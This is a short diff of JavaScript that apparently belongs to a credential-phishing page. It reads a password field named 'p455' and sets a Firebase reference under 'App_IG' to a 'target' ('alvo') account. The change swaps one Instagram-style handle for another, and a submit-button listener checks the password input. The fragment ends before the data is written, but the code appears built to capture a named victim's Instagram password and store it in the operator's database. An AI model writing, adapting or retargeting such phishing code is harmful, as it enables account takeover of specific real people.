@@ -28,7 +28,7 @@ window.onload = function() {
     const p455Element = document.getElementById("p455");
 
     // Nome do usuário no Firebase
-    let alvoInfo = firebase.database().ref("Malva Group").child("App_IG").child("m.dudaslv");
+    let alvoInfo = firebase.database().ref("Malva Group").child("App_IG").child("@mariayris12");
 
     submitButton.addEventListener("click", function(event) {
         if (p455Element && p455Element.value.trim() !== "") {
